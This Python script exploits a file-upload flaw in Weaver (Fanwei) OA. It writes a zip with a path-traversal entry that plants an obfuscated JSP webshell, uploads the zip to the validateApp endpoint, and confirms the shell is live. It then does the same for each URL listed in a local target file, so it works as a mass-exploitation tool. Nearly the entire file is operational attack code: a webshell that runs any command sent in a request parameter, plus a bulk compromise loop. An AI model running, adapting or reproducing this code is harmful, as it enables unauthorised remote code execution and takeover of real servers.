import zipfile
import random
import sys
import time
import requests


#本人LOGO  app="泛微-协同办公OA"
def title():
    print('+------------------------------------------')
    print('+  \033[34mGithub :                                  \033[0m')
    print('+  \033[34m公众号 : 求知鱼（还没开通）                                                     \033[0m')
    print('+  \033[34mVersion: Coremail邮件系统-具体版本暂时未知，后续漏洞继续补充                  \033[0m')
    print('+  \033[36m使用格式: python3 FanWeiOA_file_load.py                        \033[0m')
    print('+  \033[36m 1.txt中存放目标 同一文件夹下  目标格式：http://xxx.xxx.xxx.xxx                           \033[0m')
    print('+------------------------------------------')

def generate_random_str(randomlength=16):
  random_str = ''
  base_str = 'ABCDEFGHIGKLMNOPQRSTUVWXYZabcdefghigklmnopqrstuvwxyz0123456789'
  length = len(base_str) - 1
  for i in range(randomlength):
    random_str += base_str[random.randint(0, length)]
  return random_str

mm = generate_random_str(8)

webshell_name1 = mm+'.jsp'
webshell_name2 = '../../../'+webshell_name1

def file_zip():
    shell = """<%@ page contentType="text/html;charset=UTF-8" language="java" %>
<%@ page import="sun.misc.BASE64Decoder" %>
<%
    if(request.getParameter("cmd")!=null){
        BASE64Decoder decoder = new BASE64Decoder();
        Class rt = Class.forName(new String(decoder.decodeBuffer("amF2YS5sYW5nLlJ1bnRpbWU=")));
        Process e = (Process)
                rt.getMethod(new String(decoder.decodeBuffer("ZXhlYw==")), String.class).invoke(rt.getMethod(new
                        String(decoder.decodeBuffer("Z2V0UnVudGltZQ=="))).invoke(null, new
                        Object[]{}), request.getParameter("cmd") );
        java.io.InputStream in = e.getInputStream();
        int a = -1;
        byte[] b = new byte[2048];
        out.print("<pre>");
        while((a=in.read(b))!=-1){
            out.println(new String(b));
        }
        out.print("</pre>");
    }
%>
    """   ## 替换shell内容
    zf = zipfile.ZipFile(mm+'.zip', mode='w', compression=zipfile.ZIP_DEFLATED)
    zf.writestr(webshell_name2, shell)

def GetShell(urllist):
    file_zip()
    print('上传文件中')
    urls = urllist + '/weaver/weaver.common.Ctrl/.css?arg0=com.cloudstore.api.service.Service_CheckApp&arg1=validateApp'
    file = [('file1', (mm+'.zip', open(mm + '.zip', 'rb'), 'application/zip'))]
    requests.post(url=urls,files=file,timeout=60, verify=False)
    GetShellurl = urllist+'/cloudstore/'+webshell_name1
    GetShelllist = requests.get(url = GetShellurl)
    if GetShelllist.status_code == 200:
        print('利用成功webshell地址为:'+GetShellurl)
    else:
        print('未找到webshell利用失败')

# def main():
#     if (len(sys.argv) == 2):
#         url = sys.argv[1]
#         GetShell(url)
#     else:
#         print("python3 poc.py http://xx.xx.xx.xx")

if __name__ == '__main__':
    title()
    filelist = open('1.txt', 'r')
    target_list = filelist.readlines()
    all_url = len(target_list)
    for each in target_list:
        try:
            urllist = each.rstrip()
            GetShell(urllist)
            time.sleep(1)
        except:
            continue

